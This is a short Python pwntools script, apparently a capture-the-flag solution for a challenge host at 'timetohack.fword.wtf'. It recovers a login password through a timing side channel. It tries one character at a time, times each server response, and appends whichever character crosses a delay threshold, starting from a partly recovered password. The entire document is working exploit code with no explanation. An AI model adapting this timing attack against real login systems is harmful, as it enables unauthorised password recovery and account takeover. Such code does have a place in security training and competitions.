from pwn import *
import time
import string

p = remote("timetohack.fword.wtf", 1337)

passw = "7c80ee6589"

def check_char(char):
    payload = passw + char
    print(payload)
    try:
        p.recvuntil(">>> ")
        p.sendline("1")
        start = time.time()
        p.sendline(payload)
        p.recvuntil("Login Failed.",timeout=10)
        end = time.time()
        res = end-start
    except:
        p.interactive()
    return end-start


while True:
    print("---------")
    for char in "etaoinsrhdlucmfywgpbvkxqjz0123456789":
        cur_time = check_char(char)
        print(cur_time)
        if cur_time > 0.3 + (len(passw)+1)*0.5 :
            best_time = cur_time
            best_char = char
            print("[+]", best_char)
            break
        else:
            print("[-]",char)
    passw += best_char
    print(passw)